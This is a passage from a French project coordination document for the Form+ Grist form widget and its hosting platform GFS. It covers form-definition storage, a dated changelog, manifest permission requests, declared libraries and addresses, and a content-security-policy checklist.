  - `Definition` (Text) — la définition entière en JSON, ce que `persistOptions` mettait avant dans
    `customView.widgetOptions`. GFS ne lit que les quatre colonnes ci-dessus, celle-ci reste
    opaque pour lui. Exemple (formulaire d'inscription à 2 questions supplémentaires) :
    ```json
    {
      "formLink": "https://grist.exemple.org/o/equipe/forms/AbCdEf123456/18",
      "vsId": 42, "sourceVsId": 18, "viewRef": 9,
      "publicUrl": "https://grist.exemple.org/o/equipe/s/AbCdEf123456/p/9?style=singlePage",
      "formTitle": "Inscription à la formation", "formDescription": "",
      "questions": [
        { "id": "q1", "kind": "text", "label": "Allergie alimentaire", "writeTable": "Reponses", "writeCol": "Allergie" },
        { "id": "q2", "kind": "choice", "label": "Repas", "sourceTable": "Menus", "sourceCol": "Nom" }
      ]
    }
    ```
    `vsId` est l'id de la section de formulaire natif que FormPlus a dupliquée pour ce formulaire
    (déjà présent avant la 007) : c'est la clé de jointure réutilisée par les répondants (ci-dessous).
  - `IdSectionWidget` (Numeric) — colonne propre à Form+, au-delà des quatre que lit le manifeste
    (« si tu veux d'autres colonnes, dis-le dans ta page ») : l'id de la section PERSONNALISÉE qui
    héberge ce widget-ci (`parentKey='custom'`, jamais le formulaire natif). Sert uniquement à
    cette instance du widget pour retrouver sa propre ligne à la réouverture
    (`resolveMyDefinition`/`findMySection`, `grist-meta.js`), sans dépendre de
    `grist.onOptions()`/`getOptions()` (confirmés inopérants dans GFS par la mesure de la 007).
  - **Comment les répondants la lisent** : l'adresse publique donnée au répondant
    (`buildPublicUrl`) est une page Grist en session de partage (`/s/<clé>/p/<page>`) qui héberge CE
    MÊME widget — le répondant est donc, de son point de vue, "dans" le widget comme le
    concepteur, et `resolveMyDefinition()` (même mécanisme, même `IdSectionWidget`) lui sert
    directement sa Definition ; `ensureTableGate` (déjà utilisé pour toute autre table lue par une
    question "Choix depuis une table") ouvre la lecture de `FormPlus_Formulaires` à cette session
    de partage de la même façon. Pour le secours hors Grist (`#form=<lien>`,
    `poc/public-form.html`, pas de session Grist du tout) : `renderFill()` (`respond.js`) fait un
    `fetch` direct de l'API REST du partage (`<api>/tables/FormPlus_Formulaires/records`, la même
    déjà utilisée pour l'envoi des réponses) et retient la ligne dont `Definition.vsId` correspond
    au `vsId` du lien ouvert — avant la 007, ce secours n'affichait jamais les questions
    supplémentaires (écart connu de l'audit du 21 oct), c'est désormais corrigé.
    **Corrigé par la 008** : mesuré sur un vrai Grist, ni l'un ni l'autre de ces deux mécanismes ne
    fonctionnait (`ensureTableGate` n'ouvre pas la lecture d'une session de partage, seulement
    l'ajout) — voir la 008 ci-dessus pour ce qui les remplace.
  - **Aucune clé de réglage de vue** n'a été nécessaire (point 4 de la 007) : `IdSectionWidget`
    suffit, rien à déclarer côté GFS pour ce pas-ci.
  - Plus écrit : `persistOptions`, le marqueur de copie (`formplusDuplicate`/`formplusSource`,
    remplacé par une comparaison aux `Definition.vsId` déjà enregistrés, `fetchManagedVsIds`), la
    réparation (`#repair`, retirée du widget — `poc/repair_section_options.py` reste disponible en
    dehors de Grist pour un formulaire pas encore migré). Plus lu : `_grist_Shares`
    (`findExistingShareKey` retirée ; choisir un formulaire natif publié dans la liste affiche
    maintenant une consigne de copier son lien, au lieu d'une adresse reconstruite). Les
    formulaires faits avant la 007 restent lisibles (`options` toujours lu en repli,
    `resolveMyDefinition`) et migrent vers la table à leur prochain enregistrement, avec le même
    consentement que pour un document qui n'a encore aucun formulaire FormPlus.

## Changements qui touchent GFS
- 2026-11-23 · `e06b2bc` · **le logo du formulaire devient une image intégrée ; `img-src https:` est fermé (règle S3 tenue)**, suite de la consigne 037 (point 5, décision du porteur). Dans la Definition d'un formulaire : le champ `logoUrl` (adresse) n'est plus écrit ni lu pour l'affichage, remplacé par `logoImage: { dataUrl }` ; un formulaire d'avant garde son `logoUrl` jusqu'à sa prochaine sauvegarde et n'affiche plus de logo (il n'y avait que des formulaires de test). **Rien de nouveau n'est déclaré dans le manifeste** (aucune table, colonne, verbe, ni entrée de plus ; `manifest.json` inchangé). Pour la fenêtre « Dépendances » de GFS : la ligne « https: (tout hôte, pour le logo du formulaire) » de « Adresses que l'app appelle » disparaît ; les tuiles OpenStreetMap (inactives) sont nommées une à une.
- 2026-11-19 · `d674d31` · **kit relevé de `7aa030c` (0.24.0) à `ed0a575` (0.27.0)**, un seul pas, commit à part (consignes 038 point 1 et 039 point 1). Ce que l'app ne voit pas changer : aucune fonction du kit qu'elle appelle. Ce qui change dans le kit : le relais des appels bloqués (0.25.0, `GfsLink.tell`), le moteur de partage de Sync+ (0.26.0, que l'app n'utilise pas), l'origine de GFS retenue au premier message (0.27.0).
- 2026-11-19 · `8c24baf` · **politique de sécurité des trois pages** (consigne 037, détail dans « Consignes ») : `default-src 'none'`, Leaflet par adresses exactes + SRI, `form-action 'none'`, `connect-src https:` et `img-src https:` gardés et dits ; relais S8 (`poc/js/main.js`, consigne 038) ; `README.md` dit ce que l'app garde dans `localStorage` (consigne 039). Aucune table, colonne, verbe ni entrée de manifeste de plus.
- 2026-11-19 · `71b4ace` · `.github/dependabot.yml` (règle S7).
- 2026-11-09 · lot « construire avant le lien » (demande d'Antoine : avancer sur le formulaire sans
  coller le lien, avec un rappel qu'il n'est pas publié). Un formulaire peut maintenant exister **sans
  `formLink`, `shareKey` ni `publicUrl`** (Définition enregistrée avec `vsId` seul) : bouton
  « Construire le formulaire d'abord » du guide, puis bandeau de rappel en haut de l'éditeur
  (« Pas encore publié » ou « Presque prêt : il manque le lien ») qui rouvre le guide pour publier et
  coller le lien plus tard. **Rien de nouveau n'est déclaré dans le manifeste** : la copie reste
  un `duplicateFormSection` (le brouillon ne publie rien : aucune écriture de `shareOptions` avant le
  geste « Publier »). Ce qui s'ajoute côté courtier : (1) **lecture du formulaire par la route du
  document**, `GET <baseUrl du jeton>/forms/<section>?auth=<jeton>` (`fetchNativeForm`,
  `grist-meta.js`) à la place de la route de partage, tant que la clé manque - même jeton
  (`getAccessToken({ readOnly: true })`, « jeton », déjà déclaré) et même réponse (mesuré sur un vrai
  Grist : c'est le même code côté Grist) ; **non vérifié dans un vrai GFS** (cadre sans
  `allow-same-origin` : le `fetch` vers Grist y suit la même règle que celui des pièces jointes) ;
  (2) en publiant depuis le bandeau, Form+ marque aussi la section d'origine (vide) de la page, par la
  seule écriture `UpdateRecord _grist_Views_section {shareOptions}` (déjà permise) : Grist n'affiche
  « Partager » que sur une section publiée, et la page en porte deux côte à côte. **Aucune fenêtre
  « ceci va devenir public »** dans ce chemin (consigne 013, points 3-4) : un brouillon ne publie rien,
  et une section publiée juste avant par le geste explicite du guide (qui dit lui-même ce que ça ouvre,
  avant le clic) rend la copie, même table et même clé, sans exposition de plus. Les écritures
  `_grist_Shares` / `_grist_Pages.shareRef` demandées plus bas restent la seule chose qui rende la
  publication par Form+ possible dans GFS ; sans elles, le bandeau mène au geste à la main (la
  publication est vue toute seule). Effet de bord utile pour GFS : la copie faite par « Dupliquer »
  (consigne 021) naît sans lien ni publication ; elle s'ouvre maintenant dans l'éditeur avec le
  bandeau « Pas encore publié » et son bouton, au lieu de retomber sur l'écran de départ.
- 2026-11-09 · lot suivant le guide ci-dessous · Form+ **publie lui-même** le formulaire (bouton
  « Publier le formulaire » du guide, `publishFormSection`, `poc/js/grist-meta.js`) : les trois actions
  du bouton Publier de Grist, mesurées sur un vrai Grist (1.7.22). Côté GFS, ce que ça écrit en plus :
  `AddRecord _grist_Shares {linkId, options}` (un uuid et `{"publish":true}`), `UpdateRecord _grist_Pages
  {shareRef}`, `UpdateRecord _grist_Views_section {shareOptions}` (celle-ci déjà utilisée, voir 020).
  Chaque action est un appel à part (la ligne de partage créée donne l'identifiant dont la page a
  besoin). **Refusé, rien ne casse** : le guide montre alors le geste à la main (ouvrir la page, Publier,
  confirmer), la publication est vue toute seule comme avant. Ce qu'aucun widget ne peut faire, GFS pas
  plus : lire la clé de partage (sonde `tests/grist-env/probe-share-key.js`) ; la personne la copie
  donc toujours dans Grist (Partager > Copier le lien) et la colle dans Form+.
- 2026-11-09 · `c32ae54` · guide de publication après « Nouveau > Formulaire > Partir de zéro »
  (`poc/js/publish-guide.js`, demande d'Antoine : un message très long qui ne disait pas où était la
  page créée). Mesuré sur un vrai Grist : la page que `CreateViewSection(…, 0, 'form')` pose s'appelle
  « New page », tout en bas de la liste ; Form+ la renomme « Formulaire <table> » et déroule 3 étapes
  (ouvrir la page, Publier, copier le lien et le coller). Côté GFS, ce que ça lit/écrit en plus :
  **écriture de `_grist_Views.name`** dans un lot À PART (refus toléré : la page garde « New page »,
  le guide le dit tel quel) ; lecture de `_grist_Views_section.shareOptions` (déjà déclarée) toutes
  les 2,5 s tant que le guide attend la publication ; `getAccessToken({ readOnly: true })` (« jeton »,
  déjà déclaré) pour composer l'adresse de la page ; `GfsLink.storageSet('formplus_pending_guide', …)`
  (table, page et section en attente de publication, pour reprendre le guide après un rechargement :
  dans GFS, quitter la page de GFS pour celle du formulaire recharge le cadre, et « Nouveau » retrouve
  alors le guide au lieu de recréer une deuxième page). Dans GFS le guide donne l'adresse de la page
  **à copier** plutôt qu'un lien : un onglet ouvert depuis le cadre hérite de son bac à sable (contrats
  1.3, point 1) et Grist n'y marcherait pas.
- 2026-11-02 · `df2dc1e`…`16cf6b1` (consignes 013 et 012, cette page) · la colonne Référence cachée
  `FormPlusDef` (apparue à la 008) n'existe plus : chaque formulaire publié a maintenant sa PROPRE
  table d'une seule ligne (`FormPlus_Pub_<vsId>`, type `Ref:FormPlus_Pub_<vsId>` affichant
  `Definition`) et sa PROPRE colonne cachée (`FormPlusDef_<vsId>`) sur sa table cible - jamais
  partagées entre formulaires (013, point 1). « Partir de zéro » pose désormais sa section de
  formulaire natif sur une page TOUTE NEUVE, plus jamais la page du widget (012, point 2 ; 013,
  point 2). Une nouvelle fenêtre d'accord apparaît quand `generate()` publie une copie d'un
  formulaire natif collé (013, points 3/4) et quand le mode interne s'active pour la première fois
  (`FormPlus_Repondants`, 012, point 6). Un document déjà touché par l'ancien portillon de
  `FormPlus_Formulaires` (`038dd1b`, retiré par la 008) se voit maintenant proposer de le
  dépublier, jamais de le supprimer (012, point 7).
- 2026-10-22 · `c249c4a` (consignes 008-011, cette page) · sous-module `kit/` à `c0c8660` (010) ;
  plus de section de garde (`ensureTableGate`) pour `FormPlus_Formulaires` (008) ; une colonne
  Référence cachée `FormPlusDef` apparaît désormais sur la table cible de CHAQUE formulaire natif
  géré par Form+ (type `Ref:FormPlus_Formulaires`, affichage `Definition`, champ masqué sur la
  section publiée) — purement un détail d'implémentation côté répondant (008, point 3), jamais lue
  ni écrite par Form+ lui-même en dehors de ce mécanisme, sans lien avec les colonnes que lit le
  manifeste.
- 2026-10-21 · `02be13c` (fusion `652b156`) · mode interne : réglage par formulaire + réservation
  par question, table `FormPlus_Repondants` (identité du répondant via `user.Email`, colonne à
  formule — capacité `formules` du contrat GFS, accord de la personne à la création), jamais
  utilisée pour le lien public anonyme.
- 2026-10-21 · `aa13d26` puis `85ac56d` · CSP de `widget.html` : `script-src` autorise à nouveau
  `https://docs.getgrist.com`, d'où `plugin-loader.js` fait venir le script d'API de Grist en repli
  dès que l'origine qui héberge le widget n'est pas dans sa liste blanche — régression qui bloquait
  Form+ sur toute instance auto-hébergée, GFS compris, corrigée le jour même.
- 2026-10-21 · `00ad9d5` · le lien public ne montre plus jamais l'écran de configuration à un
  visiteur externe réel (`main.js`).
- 2026-10-21 · `90958ac` · référence le kit commun `grist-factory-kit` en sous-module `kit/`, au
  commit `54c48f3` (pas d'étiquette `v0.1.0` réelle sur leur dépôt malgré la consigne 005, voir
  « Questions » ci-dessous) ; rien d'autre ne change, aucun fichier du kit copié dans `poc/`
- 2026-10-21 · `196734d` · licence du dépôt passée d'Apache-2.0 à GPL 3.0 (consigne 004)
- 2026-10-21 · `7f75d83`…`952fe4c` (consigne 005) · `kit/css/tokens.css` et `kit/css/windows.css`
  chargés dans `widget.html`, remplacent la palette propre de FormPlus ; `poc/js/theme.js` délègue
  l'état clair/sombre à `Theme` du kit (la couleur d'accent personnalisée reste posée sur `#fill`
  uniquement, jamais sur `<html>` — testé) ; tout le texte d'interface (designer et répondant) passe
  par `I18n` du kit (`poc/js/strings.js`, ~150 clés `form.*`) ; `window.prompt()`/`confirm()`
  remplacés par `Dialogs.prompt()`/`Dialogs.confirm()` du kit.
- 2026-10-21 · `39e0740` (consigne 006) · `.toggle-thumb` et `.pv-q` (`poc/css/widget.css`)
  passent de couleurs en dur à `--shadow-card`/`--shadow-float` du kit ; plus aucune couleur en dur
  dans `widget.css` hors `#qrCanvas`
- 2026-10-21 · `96cf415` · « Liste de références » ajoute une colonne RefList cachée
  (`ensureRefListField`, `FormPlus_srcL_<table>_<colonne>`) et y écrit
  `_grist_Tables_column.visibleCol`, comme pour un choix simple : sans cela la session de partage
  anonyme affiche l'identifiant numérique au lieu du libellé choisi.
- 2026-10-21 · `038dd1b` (consigne 007) · plus aucune écriture dans
  `_grist_Views_section.options` ni lecture de `_grist_Shares` : la définition de chaque
  formulaire vit dans la table du document `FormPlus_Formulaires` (une ligne par formulaire,
  colonnes et détail dans « Consignes » ci-dessus), créée avec l'accord de la personne (fenêtre du
  kit) et ouverte en lecture aux sessions de partage par `ensureTableGate`, déjà utilisé pour toute
  autre table lue par une question "Choix depuis une table".

## Questions pour GFS
(aucune en attente)

## Demandes à GFS
- manifeste · `gristInterne` · `_grist_Shares` · `lit: false`, `ecrit: ["linkId", "options"]` (verbes
  `AddRecord` puis `UpdateRecord`) et `_grist_Pages` · `ecrit: ["shareRef"]` (`UpdateRecord`) · pour que
  Form+ publie le formulaire à la place de la personne (deux clics de moins dans Grist, la confirmation
  de Grist en moins). `_grist_Views_section.shareOptions` en écriture est déjà déclarée. Sans ces
  entrées, rien ne casse : le courtier refuse, Form+ propose le geste à la main.
- manifeste · `gristInterne` · `_grist_Views` · `lit: true`, `ecrit: ["name"]` · pour nommer la page
  du formulaire créé « Formulaire <table> » au lieu de « New page » (que le moteur de Grist pose,
  en anglais, tout en bas de la liste des pages, et que la personne ne retrouve pas). Un seul
  `UpdateRecord` par formulaire créé, dans son propre lot. Sans cette entrée, rien ne casse : le
  courtier refuse, Form+ garde « New page » et le dit (`poc/js/grist-meta.js`, `nameFormPage`).
- kit/courtier · ouvrir une page du document dans un onglet **hors cage** (par exemple
  `GfsLink.openPage(page)`, qui ferait `window.open` depuis GFS lui-même, non isolé) · le bouton
  « Ouvrir la page » de Form+ ne peut aujourd'hui qu'être un lien en nouvel onglet, qui hérite du bac
  à sable de GFS : Form+ remplace donc ce bouton par « Copier l'adresse de la page » quand GFS
  l'héberge. Dès que le kit expose ce verbe, Form+ l'appelle (un changement de `publish-guide.js`).
- leaflet · 1.9.4 · type de question « Lieu sur carte » (`poc/js/kinds.js`, `poc/js/respond.js`) ·
  en attente de l'entrée de Form+ dans GFS (décision du porteur, consigne 006) ; d'ici là, le
  chargement autonome (`window.FORMPLUS_ENABLE_MAP`, unpkg) reste le mécanisme hors GFS
- vitrine · `700798a` · `vitrine/vitrine.json` · description et trois captures pour la carte et la fiche

(« modeles » · `8f5131c` · `modeles/modeles.json` : sortie de cette liste par la 034, GFS les a rangés dans sa galerie `modeles/form/`
et déclare `modeles` et `ouverture.modele` dans son manifeste.)

## Bibliothèques que l'app charge elle-même
Déclarée le 2026-11-18 (consigne 035) d'après le code de `f999d86`, mise à jour le 2026-11-19 (consignes 037 et 039 : adresses exactes de Leaflet et leur empreinte, kit à 0.27.0) et le 2026-11-23 (tuiles et images de Leaflet nommées dans `img-src`). Une ligne par bibliothèque ou famille, aucune vérifiée par GFS.
- grist-plugin-api · API de widget de Grist (`grist-plugin-api.js`) · — · https://docs.getgrist.com/grist-plugin-api.js · démarrage · Service de Grist, sans numéro de version. Chargée à l'ouverture seulement quand la page est dans un cadre (jamais par `poc/public-form.html`, qui ne charge aucun script distant). L'origine est celle de la page Grist qui encadre le widget si elle figure dans la liste blanche `TRUSTED_ORIGINS` de `poc/js/plugin-loader.js` (aujourd'hui `docs.getgrist.com` seul), sinon `docs.getgrist.com` ; la politique de sécurité de `widget.html` n'autorise que cette adresse.
- leaflet · Leaflet · 1.9.4 · https://unpkg.com/leaflet@1.9.4/dist/ · option · contient : leaflet.js, leaflet.css · paquet : leaflet · Type de question « Lieu sur carte ». Depuis le 19/11 (consigne 037), la politique de `poc/widget.html` nomme les deux fichiers par leur adresse exacte (jamais `unpkg.com` entier) et `loadLeaflet` les charge avec leur empreinte SRI (`sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=` pour `leaflet.js`, `sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=` pour `leaflet.css`) et `crossorigin="anonymous"`. Inactive aujourd'hui, dans GFS comme hors GFS : chargée seulement si `window.FORMPLUS_ENABLE_MAP === true` est posé avant `main.js` (`mapFeatureEnabled`, `poc/js/kinds.js`), et rien dans l'app livrée ne le pose ; sans cela le type est grisé et la réponse se fait par coordonnées. Si elle était activée : chargée à la demande, au premier affichage d'une question « Lieu sur carte » (`loadLeaflet`, `poc/js/respond.js`). Attend le mot du porteur (028).
- tuiles-openstreetmap · Tuiles de la carte OpenStreetMap · — · https://tile.openstreetmap.org/ · option · Service en ligne (images de fond de carte), contacté par les sous-domaines `a`, `b` et `c` (`respond.js`), seulement avec la carte Leaflet ci-dessus, donc jamais aujourd'hui ; depuis le 23/11, la politique de `poc/widget.html` nomme les trois hôtes un à un dans `img-src` (plus de `https:`). Sans numéro de version.
- qrcodejs · QRCode for JavaScript (qrcodejs) · — · https://lombre33.github.io/FormPlus/poc/qrcode.js · démarrage · Copie gardée dans le dépôt (`poc/qrcode.js`, licence MIT, algorithme de Kazuhiko Arase repris par davidshimjs), sans dépendance et sans numéro de version dans le fichier. Chargée à l'ouverture par `poc/widget.html` (balise `script` classique), utilisée seulement pour le code QR du lien public.
- kit-grist-factory · Kit commun Grist Factory (`grist-factory-kit`) · 0.27.0 · https://lombre33.github.io/FormPlus/kit/ · démarrage · contient : tokens.css, windows.css, i18n, theme, dialogs, gfs-link, host, ambiance, violations · C'est le kit de GFS lui-même : sous-module git à `ed0a575`, copié dans le dépôt de l'app et servi par le site de l'app (GitHub Pages), pas par GFS. Aucune bibliothèque dans le kit ; ôte cette ligne de ton manifeste si ta fenêtre le montre déjà par ailleurs.

(Pas des chargements de code, donc non listés : les appels de données de l'app à l'instance Grist qui l'héberge, le formulaire natif, la clé de partage, les enregistrements et les pièces jointes, par `fetch` ; et les liens « ouvrir sur openstreetmap.org » que la personne clique elle-même. Aucune police distante : polices du système.)

## Adresses que l'app appelle
Déclarées le 2026-11-19 (consigne 037) d'après la politique de `poc/widget.html` (la page que GFS ouvre) à `8c24baf`, **mises à jour le 2026-11-23 à `e06b2bc`** (le logo n'est plus une adresse) ; `poc/public-form.html` n'ajoute que le serveur Grist de la personne. Hors adresses : `'self'` (le site de l'app, ses scripts, ses feuilles, le kit).
- https://docs.getgrist.com/grist-plugin-api.js · script · l'API de widget de Grist, avec `'unsafe-eval'` (le fichier s'évalue par `eval()`, consigne 018) ; chargée seulement quand la page est dans un cadre · envoie des données de la personne : non (elle ne parle qu'au Grist qui encadre la page)
- serveur Grist de la personne · connect · lire le formulaire natif (route du document avec jeton, ou route de partage avec clé), télécharger une pièce jointe avec jeton, envoyer les réponses et les pièces jointes d'un répondant (`/api/s/<clé>/…`) ; l'hôte n'est connu qu'à l'exécution (`getAccessToken().baseUrl`, ou l'hôte du lien de formulaire collé), d'où `connect-src https:` · oui, après un geste (« Envoyer » du répondant ; la lecture par le concepteur n'envoie rien)
- https://unpkg.com/leaflet@1.9.4/dist/leaflet.js · script · Leaflet, carte du type « Lieu sur carte » ; **inactive** (rien ne pose `window.FORMPLUS_ENABLE_MAP`), avec empreinte SRI · non
- https://unpkg.com/leaflet@1.9.4/dist/leaflet.css · style · la feuille de Leaflet, même condition, avec empreinte SRI · non
- https://a.tile.openstreetmap.org/, https://b.tile.openstreetmap.org/ et https://c.tile.openstreetmap.org/ · img · tuiles de la carte ; **inactive** comme Leaflet ; nommées une à une dans `img-src` depuis le 23/11 · oui, après un geste (la zone de carte affichée se lit dans les tuiles demandées)
- https://unpkg.com/leaflet@1.9.4/dist/images/ · img · les images de Leaflet (marqueur) ; **inactive** comme Leaflet ; nommée dans `img-src` depuis le 23/11 · non
- (Aucune image ne vient d'une adresse : le logo et les images de description sont des `data:` intégrées au formulaire, `img-src 'self' data:`.)

## Sécurité
Déclarée le 2026-11-19 (consigne 037), mise à jour le 2026-11-23 (S3, S6) ; ce que GFS lit : `poc/widget.html` et le code à `e06b2bc`.
- S1 · tenue · une balise `<meta http-equiv="Content-Security-Policy">` dans `poc/widget.html` (la page que GFS ouvre), `poc/public-form.html` et `index.html`.
- S2 · tenue · `default-src 'none'` dans les trois pages ; `object-src 'none'`, `base-uri 'none'`, `form-action 'none'` ; dans `widget.html`, `font-src`, `media-src`, `frame-src` et `worker-src` fermés explicitement.
- S3 · **tenue depuis le 23/11/2026** · seul `connect-src https:` reste ouvert à `https:` : c'est l'exception dite (serveur Grist de la personne, jeton d'accès, hôte inconnu d'avance). `img-src` est `'self' data:` plus les adresses exactes des tuiles OpenStreetMap et des images de Leaflet (carte inactive) : le logo n'est plus une adresse mais une image intégrée (voir la 037, point 5). Aucune autre ouverture en `https:`, ni `*`, ni `http:`. Limite à connaître : tant que `connect-src https:` est ouvert, la politique n'empêche pas à elle seule un code piraté d'envoyer une donnée par `fetch` vers un hôte en `https:`.
- S4 · tenue · `script-src` : `'self'`, l'adresse entière du script d'API de Grist avec `'unsafe-eval'` (consigne 018), et les deux fichiers de Leaflet par adresse exacte ; jamais `'unsafe-inline'`, `*`, `https:`, `data:` ni `blob:` pour un script. `style-src 'unsafe-inline'` (tolérée) reste nécessaire : attributs `style` dans `widget.html` et les gabarits de `poc/js/`.
- S5 · tenue · bibliothèques déclarées dans « Bibliothèques que l'app charge elle-même » ; Leaflet à version exacte (1.9.4) avec `integrity` et `crossorigin="anonymous"` (unpkg sert, pour une version exacte, les fichiers du paquet npm ; empreintes recalculées dessus) ; `qrcode.js` et le kit sont des copies du dépôt. Le script d'API de Grist est celui du service Grist : sans empreinte possible.
- S6 · tenue (déclarée) · aucune mesure d'audience, aucun traceur, aucun journal d'erreurs envoyé ; ce qui part du document : les réponses du répondant vers son Grist (geste « Envoyer »), la publication d'un formulaire (bouton « Publier » du guide, accord de la personne, consignes 013 et 030). Aucune requête vers un tiers : le logo n'est plus une adresse (voir S3). Aucun secret dans le dépôt (recherche faite le 19/11 : aucune clé, aucun jeton écrits) ; le jeton d'accès de Grist n'est jamais gardé.
- S7 · tenue · `.github/dependabot.yml` (actions de la CI et Playwright, chaque semaine) ; le kit (sous-module) n'est pas suivi par Dependabot, sa référence avance par tes consignes et se dit dans « Changements qui touchent GFS ». Non vérifié d'ici : l'activation des alertes de sécurité dans les réglages du dépôt.
- S8 · tenue le 19/11/2026 · `import '../../kit/js/violations-start.js';` en première ligne d'import de `poc/js/main.js`, kit 0.27.0 (`ed0a575`) ; mesuré avec un GFS simulé (voir la 038). Limite : un appel en `https:` vers un hôte quelconque n'est pas bloqué par `connect-src https:` et ne lève donc aucune alerte.
- S9 · tenue · `SECURITY.md` à la racine : politique de divulgation de l'État et signalement privé GitHub.
